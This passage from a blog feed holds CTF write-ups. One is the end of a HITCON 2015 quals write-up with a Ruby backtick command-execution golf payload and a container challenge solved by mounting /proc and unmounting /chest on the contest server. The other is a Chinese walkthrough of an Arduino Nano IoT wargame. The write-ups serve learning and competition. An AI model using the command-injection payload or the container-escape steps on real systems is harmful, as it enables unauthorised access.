&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Still 1 byte more than the limitation,&lt;br /&gt;
I kept finding if there's a predefined variable in Ruby defualt to &lt;code&gt;0&lt;/code&gt; or&lt;br /&gt;
if &lt;code&gt;nil&lt;/code&gt; can be trans to &lt;code&gt;0&lt;/code&gt; because lots of predefined variable are default to &lt;code&gt;nil&lt;/code&gt;.&lt;br /&gt;
But NO.  &lt;/p&gt;
&lt;p&gt;Then one of my teammates came up with the &lt;code&gt;10 bytes&lt;/code&gt; solution,&lt;br /&gt;
by using &lt;code&gt;~&lt;/code&gt;, the &lt;code&gt;Binary Ones Complement Operator&lt;/code&gt;. (bitwise Not)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `$#{~-1}` == `$#{0}` == `$0`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag4&lt;br /&gt;
&lt;code&gt;hitcon{It's hard to say where ruby went wrong QwO}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;After the competition end,&lt;br /&gt;
the author of this challenge released the same 10 bytes solution on IRC.&lt;br /&gt;
But said they got a &lt;code&gt;9 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="sr"&gt;//&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I don't know how this solution works,&lt;br /&gt;
but it does not work on my computer with Ruby 2.2.3,&lt;br /&gt;
which &lt;code&gt;~//&lt;/code&gt; will be treat as &lt;code&gt;nil&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Stego - Piranha Gun [50]&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &amp;quot;piranha&amp;quot; projectile that costs no ammunition.  
`nc 54.178.235.243 10004`  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="m"&gt;54&lt;/span&gt;.178.235.243 &lt;span class="m"&gt;10004&lt;/span&gt;  
bash: cannot &lt;span class="nb"&gt;set&lt;/span&gt; terminal process group &lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class="k"&gt;for&lt;/span&gt; device  
bash: no job control in this shell  
bash: /root/.bashrc: Permission denied  
root@ip-172-31-19-201:/home/PiranhaGun# ls  
ls  
README  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After connected to the server, there's a README.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# cat README  
cat README  
The Piranha Gun can be found in &amp;quot;jungle.chest&amp;quot;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We searched if there's a file or directory with this name by using  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep -r "jungle.chest" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "jungle" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "chest" / 2&amp;gt;/dev/null&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;But NO. There's only a directory &lt;code&gt;/chest&lt;/code&gt;, but it's empty.  &lt;/p&gt;
&lt;p&gt;After tried something else, we still stucked.&lt;br /&gt;
Then, one of my teammates said he remembered security issue about the &lt;code&gt;proc&lt;/code&gt; in container.&lt;br /&gt;
After took a look at &lt;code&gt;ps&lt;/code&gt;, we got a clue.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# ps  
ps  
Error, do this: mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  
mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  
cd /proc  
root@ip-172-31-19-201:/proc# ls -al  
ls -al  
total 4  
dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  
drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  
dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  
dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  
-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  
lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&amp;gt; self/mounts  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  
lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&amp;gt; self/net  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  
dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&amp;gt; 7  
-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  
dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  
--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&amp;gt; 7/task/7  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  
-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's take some search.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
Binary file ./15/task/15/cmdline matches  
./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
Binary file ./15/cmdline matches  
./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We've already found &lt;code&gt;/chest&lt;/code&gt; before and knew it's empty.&lt;br /&gt;
So, maybe unmount it?  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# umount /chest  
umount /chest  
root@ip-172-31-19-201:/proc# cd /chest  
cd /chest  
root@ip-172-31-19-201:/chest# ls  
ls  
jungle.chest  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ta da!  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/chest# cat jungle.chest  
cat jungle.chest  
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Stego - unreadable [100]&lt;/h2&gt;
&lt;p&gt;We got a file &lt;a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164"&gt;unreadable-4b2868cc26a8dad5695e537a9dd8a164&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;by using &lt;code&gt;xxd&lt;/code&gt; to check it.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png" /&gt;  &lt;/p&gt;
&lt;p&gt;the flag is &lt;code&gt;hitcon{WE USE XXD INSTEAD OF IDA PRO}&lt;/code&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Mon, 19 Oct 2015 11:42:55 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-10-19:posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</guid><category>CTF</category><category>HITCON</category><category>Write-up</category><category>Ruby</category><category>Conf</category><category>Security</category></item><item><title>HITCON 2015 IOT Wargame</title><link>https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/</link><description>&lt;p&gt;今年的 HITCON 的主題是 IoT，&lt;br /&gt;
所以 Wargame 也配合了 IoT 的主題，&lt;br /&gt;
用 Arduino Nano + Raspberry Pi 出題。  &lt;/p&gt;
&lt;p&gt;Wargame 的網址是 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt;&lt;br /&gt;
&lt;img alt="IOT Wargame" src="/files/hitcon-2015-iot-wargame/iot_wargame.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Arduino Nano 部份&lt;/h2&gt;
&lt;p&gt;Arduino Nano 的題目只有三題，&lt;br /&gt;
(原本好像有打算出四題的感覺，但可能時間來不及的關係)&lt;br /&gt;
而且難度蠻簡單的，&lt;br /&gt;
其實蠻適合所有會眾入門，&lt;br /&gt;
而且每位會眾報到後都會拿到已經把題目燒進去的 Arduino Nano。&lt;br /&gt;
(還有附排針，但題目不會用到，原本一看到以為要現場焊接XD)&lt;br /&gt;
但參與度好像不高，&lt;br /&gt;
寫這篇文章的當下，&lt;br /&gt;
總計是 243 位註冊帳號，&lt;br /&gt;
其中 161 位至少答對一題，&lt;br /&gt;
三題全部都做完的有 69 位。  &lt;/p&gt;
&lt;p&gt;我自己是在第一天議程結束後的晚上才開始看題目，&lt;br /&gt;
然後大概花3個多小時才把三題都解出來，&lt;br /&gt;
(GeoHot 花了一個多小時就全解完了QQ)&lt;br /&gt;
以下寫一下自己的解法，&lt;br /&gt;
供有興趣的人參考，&lt;br /&gt;
有問題也歡迎回覆。  &lt;/p&gt;
&lt;p&gt;其實題目真的不難，&lt;br /&gt;
真的有在打 Wargame 或 CTF 的人應該覺得簡單到沒必要浪費時間寫 Write-up 吧XD&lt;br /&gt;
但因為身邊還是有人不會寫，&lt;br /&gt;
所以秉持著推廣一下 Wargame 跟 CTF 的精神寫一下這部份，&lt;br /&gt;
Orange 出的 RPi 題目我就解不出來了 XDrz  &lt;/p&gt;
&lt;h3&gt;1. 讓 Arduino Nano 能被你的電腦讀到&lt;/h3&gt;
&lt;p&gt;老實說這應該是最難的部份了，&lt;br /&gt;
因為第一次接觸 Arduino，&lt;br /&gt;
所以我在這上面花蠻多時間的Orz&lt;br /&gt;
IRC 上也很多人在詢問，&lt;br /&gt;
有看到有人在問 Mac, Windows&lt;br /&gt;
就是沒看到有人問 Linux 的，&lt;br /&gt;
(噢，好像有看到有人問 Ubuntu 的?有點忘記了)&lt;br /&gt;
因為我本身用 Arch Linux，&lt;br /&gt;
所以這篇文章會以 Arch Linux 為主，&lt;br /&gt;
(順便偷偷推廣 &lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt; XD)  &lt;/p&gt;
&lt;p&gt;Windows 的使用者可以參考會眾 toby 寫的教學&lt;br /&gt;
&lt;a href="http://toby.logdown.com/posts/293552/hitcon-play-nano-on-windows"&gt;HITCON 之 Windows 也要玩 Nano « Toby 'n Hack&lt;/a&gt;，&lt;br /&gt;
仍然不行的話，可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/Windows"&gt;Arduino - Windows&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;Mac 的使用者可以參考這篇 &lt;a href="http://arduino.stackexchange.com/questions/5119/arduino-nano-no-serial-port-for-macbook-air-2013"&gt;Arduino Nano no serial port for MacBook Air 2013 - Arduino Stack Exchange&lt;/a&gt; (但有人反應裝了還是讀不到)&lt;br /&gt;
仍然不行的話，也可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/MacOSX"&gt;Arduino - MacOSX&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;至於 Linux 的話，可以參考 Arduino 官方的這篇 &lt;a href="http://playground.arduino.cc/Learning/Linux"&gt;Arduino Playground - Linux&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;而 Arch Linux 的話，當然就是看官方的 &lt;a href="https://wiki.archlinux.org/index.php/Arduino"&gt;Arduino - ArchWiki&lt;/a&gt;，從 AUR 上安裝 Arduino。  &lt;/p&gt;
&lt;p&gt;(但其實我在還沒安裝 AUR 的 Arduino 時，&lt;br /&gt;
就已經出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 了，&lt;br /&gt;
所以我覺得應該是有 driver 的，&lt;br /&gt;
但我當時還不知道怎麼改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
所以還是裝了 AUR 的 arduino 套件，&lt;br /&gt;
直到看到 &lt;a href="http://playground.arduino.cc/Interfacing/Python"&gt;Arduino Playground - Python&lt;/a&gt;&lt;br /&gt;
才發現是 &lt;code&gt;port&lt;/code&gt; 的值錯了&lt;br /&gt;
才覺得一開始可能不用裝 &lt;code&gt;arduino&lt;/code&gt; 也會動，&lt;br /&gt;
但也懶的移除了。&lt;br /&gt;
所以如果有人也有這樣的情況，然後也還沒裝 arduino 的話，&lt;br /&gt;
可以先試試看直接改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
看能不能用，這樣就不用多裝 3xx MB 的 arduino 套件了。&lt;br /&gt;
至於怎麼改 port，下面會提到)  &lt;/p&gt;
&lt;p&gt;如果沒有出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 或是試了不成功的話，&lt;br /&gt;
就繼續試試  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S arduino  
sudo gpasswd -a $user uucp  
sudo gpasswd -a $user lock  
sudo gpasswd -a $user tty  
sudo modprobe cdc_acm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之後，登出再登入。&lt;br /&gt;
ArchWiki 上是說會出現 &lt;code&gt;/dev/ttyACMx&lt;/code&gt; (x 為數字)&lt;br /&gt;
但我的是 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt;，一樣可以正常使用。  &lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;screen /dev/ttyUSB0 115200&lt;/code&gt; 確認有顯示以下內容就是有讀到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HITCON 2015 NANO GAME  

Nano$ [0] Morse  
Nano$ [1] Maze  
Nano$ [2] Calculator  
Nano$ enter your choice:  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. 透過 pip 安裝 pyserial&lt;/h3&gt;
&lt;p&gt;在使用官方提供的 &lt;code&gt;ans.py&lt;/code&gt; 之前，&lt;br /&gt;
記得先安裝必要的套件 &lt;code&gt;pyserial&lt;/code&gt;&lt;br /&gt;
使用 &lt;code&gt;pip install pyserial&lt;/code&gt;&lt;br /&gt;
安裝完後，打開 &lt;code&gt;ans.py&lt;/code&gt;&lt;br /&gt;
將第 67 行的 &lt;code&gt;port=3&lt;/code&gt; 改成 &lt;code&gt;port='/dev/ttyUSB0'&lt;/code&gt;&lt;br /&gt;
(這邊的 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 視實際情況更改)&lt;br /&gt;
就可以開始修改 &lt;code&gt;ans.py&lt;/code&gt; 進行 Python Wargame 了(?)  &lt;/p&gt;
&lt;p&gt;修改第 47 行的 choice 可以選擇要解的題目，&lt;br /&gt;
'0' == NANO 1&lt;br /&gt;
'1' == NANO 2&lt;br /&gt;
'2' == NANO 3  &lt;/p&gt;
&lt;p&gt;每個 *.tgz 用 &lt;code&gt;tar zxvf $tgz_file&lt;/code&gt; 解開&lt;br /&gt;
每個裡面的 readme.txt 基本上都一樣的，不太需要看  &lt;/p&gt;
&lt;p&gt;每題拿到 key 之後，&lt;br /&gt;
請複製該 key，&lt;br /&gt;
再到 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt; 登入，&lt;br /&gt;
然後點選對應的題目，&lt;br /&gt;
至右下角 &lt;code&gt;enter key&lt;/code&gt; 欄位，&lt;br /&gt;
貼上 key，之後按 send 送出。  &lt;/p&gt;
&lt;p&gt;以下開始講解各題：  &lt;/p&gt;
&lt;h3&gt;NANO 1&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-1.tgz"&gt;NANO 1 原始檔&lt;/a&gt;&lt;br /&gt;
這題會拿到一串&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81"&gt;摩斯密碼&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;.... .. - -.-. --- -. -. .- -. --- --. .- -- . -- --- .-. ... .&lt;/code&gt;&lt;br /&gt;
隨便找個解摩斯密碼的網站 &lt;a href="http://morsecode.scphillips.com/translator.html"&gt;http://morsecode.scphillips.com/translator.html&lt;/a&gt;&lt;br /&gt;
解碼後得到 &lt;code&gt;HITCONNANOGAMEMORSE&lt;/code&gt;&lt;br /&gt;
把 &lt;code&gt;game0()&lt;/code&gt; 的 &lt;code&gt;answer = ''&lt;/code&gt; 改成 &lt;code&gt;answer = 'HITCONNANOGAMEMORSE'&lt;/code&gt;&lt;br /&gt;
再執行一次 &lt;code&gt;ans.py&lt;/code&gt; 便可得到 key  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 457E1A295B9D1C48&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 2&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-2.tgz"&gt;NANO 2 原始檔&lt;/a&gt;&lt;br /&gt;
這是三題裡面最難的一題，也是三題中最少人解出來的。&lt;br /&gt;
這題要在九秒內走出 &lt;code&gt;14*14&lt;/code&gt; 的迷宮，&lt;br /&gt;
從 &lt;code&gt;(0, 0)&lt;/code&gt; 走到 &lt;code&gt;(14,14)&lt;/code&gt;&lt;br /&gt;
(除非你手速夠快，不然以本題的設計基本上九秒走不完)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;O&amp;#39; 代表人、&amp;#39;.&amp;#39; 代表路、&amp;#39;+&amp;#39; 代表牆、&amp;#39;X&amp;#39; 代表出口  
&amp;#39;w&amp;#39; 往上走、&amp;#39;a&amp;#39; 往左走、&amp;#39;s&amp;#39; 往下走、&amp;#39;d&amp;#39; 往右走  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;必須修改 &lt;code&gt;game1()&lt;/code&gt; 裡頭的內容，&lt;br /&gt;
把走迷宮的演算法寫在裏面。  &lt;/p&gt;
&lt;p&gt;我用的方法其實是半自動的，在必要的時候需要手動，也不保證每次成功。&lt;br /&gt;
(要全自動的話可能需要用 &lt;a href="https://en.wikipedia.org/wiki/Breadth-first_search"&gt;BFS&lt;/a&gt;，但我太廢，覺得這樣已經能解出題目就夠了。)  &lt;/p&gt;
&lt;p&gt;程式每次會呈獻 3x3 的現在位置地圖，&lt;br /&gt;
因為 'O' 每次的位置不固定，&lt;br /&gt;
所以先找到 'O' 的現在位置後，&lt;br /&gt;
將其紀錄為 &lt;code&gt;pos_x&lt;/code&gt; 和 &lt;code&gt;pos_y&lt;/code&gt;，&lt;br /&gt;
方便之後判斷其上下左右是否可走。  &lt;/p&gt;
&lt;p&gt;再來因為我們要往右下方行走才能到達出口，&lt;br /&gt;
所以就判斷如果 'O' 的右邊(&lt;code&gt;lines[pos_y, pos_x+1]&lt;/code&gt;) 是 '.'(路) 的話就往右走，&lt;br /&gt;
已右邊舉例的話，如果有下列情況的話，就改換下一個優先的方向檢查： (按照 右、下、左、上 的順序)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邊界(&lt;code&gt;pos_x == 2&lt;/code&gt;)  (&lt;code&gt;pos_x+ 1&lt;/code&gt; 就超出邊界了)  &lt;/li&gt;
&lt;li&gt;'O' 的右邊是 '+' (牆)  &lt;/li&gt;
&lt;li&gt;上一步是往左走(往反方向走)  &lt;ul&gt;
&lt;li&gt;避免左右左右、上下上下這種不會前進的狀況發生  &lt;/li&gt;
&lt;li&gt;造成了另一個問題，每當走入三面都是牆的洞的時候，就會卡住。  &lt;/li&gt;
&lt;li&gt;這時就會需要手動移動  &lt;/li&gt;
&lt;li&gt;因為要得知上一步，所以我建立了 &lt;code&gt;steps = [None]&lt;/code&gt; 紀錄每一步的順序  &lt;/li&gt;
&lt;li&gt;把每次的移動利用 &lt;code&gt;steps.append()&lt;/code&gt; 紀錄起來  &lt;/li&gt;
&lt;li&gt;並在每次透過 &lt;code&gt;steps[-1]&lt;/code&gt; 得知上一步  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;依此類推，照著 &lt;code&gt;右、下、左、上、手動&lt;/code&gt; 的先後順序，寫出程式碼。&lt;br /&gt;
開始執行後，遇到卡住的狀況就手動控制，試個幾次很快就可以走出迷宮  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 3D52CB746F9E6C83&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 3&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-3.tgz"&gt;NANO 3 原始檔&lt;/a&gt;&lt;br /&gt;
這題是必須在一秒內回答四則運算的結果，&lt;br /&gt;
看一下題目，可以發現題目的字串長的像這樣&lt;br /&gt;
&lt;code&gt;Nano$ 7 * 10 - 14 + 6 - 5 - 19 = ?&lt;/code&gt;&lt;br /&gt;
所以可以透過 Regular Expression&lt;br /&gt;
&lt;a href="https://docs.python.org/2/library/re.html"&gt;7.2. re — Regular expression operations — Python 2.7.10 documentation&lt;/a&gt;&lt;br /&gt;
把 &lt;code&gt;7 * 10 - 14 + 6 - 5 - 19&lt;/code&gt; 取出來後&lt;br /&gt;
丟給 &lt;a href="https://docs.python.org/2/library/functions.html#eval"&gt;eval()&lt;/a&gt; 算出結果，&lt;br /&gt;
再把值 assign 給 answer 回答。&lt;br /&gt;
(&lt;code&gt;eval()&lt;/code&gt; 可以把字串當作 expression 進行求值，雖然很方便，但真正在開發程式的時候最好不要亂用，尤其是不要把使用者輸入的資料丟給 &lt;code&gt;eval()&lt;/code&gt;，因為你永遠不知道使用者會輸入什麼奇怪的東西)&lt;br /&gt;
照著這個想法修改一下 &lt;code&gt;game2()&lt;/code&gt;，這題應該就解決了  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 273A9C1E2D380B48&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;極度建議自己寫程式碼，&lt;br /&gt;
真的真的想不出來的話再點下面的連結吧！&lt;br /&gt;
不然是不會進步的。&lt;br /&gt;
程式碼請見：&lt;a href="https://gist.github.com/M157q/164f9ba5bd8ae0b18afe"&gt;https://gist.github.com/M157q/164f9ba5bd8ae0b18afe&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;然後看到 IRC 有人提到，&lt;br /&gt;
他把 Nano 上的 binary dump 到電腦上，&lt;br /&gt;
直接用 &lt;code&gt;strings&lt;/code&gt; 拿到 3 個 key，&lt;br /&gt;
不知道怎麼做到的&lt;br /&gt;
查了一些關鍵字，會是&lt;code&gt;avr-objdump&lt;/code&gt;嗎?  &lt;/p&gt;
&lt;blockquote&gt;
